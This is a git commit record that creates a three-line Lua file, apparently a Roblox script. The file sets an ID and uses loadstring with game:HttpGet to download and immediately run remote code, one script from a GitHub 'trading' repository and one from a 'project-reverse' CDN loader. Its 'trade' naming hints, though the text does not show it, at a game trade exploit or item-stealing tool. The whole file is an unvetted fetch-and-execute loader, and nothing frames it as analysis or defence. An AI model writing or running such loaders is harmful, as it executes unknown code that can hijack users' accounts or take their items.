78c17e32a0149958a1059e1d1956b5de8998be92
txurpaynu <benjamingonzalezecheverria@gmail.com>
2026-09-17 00:10:58 -0300

    Create fif.lua

---
+++ fif.lua
@@ -0,0 +1,3 @@
+ID="3fa43d90-075d-406d-9093-8210dc4f4ee8";
+RUN_AFTER=loadstring(game:HttpGet("https://raw.githubusercontent.com/txurpaynu/trade/refs/heads/main/trading.lua"));
+loadstring(game:HttpGet("https://cdn.project-reverse.org/loader.luau"))();
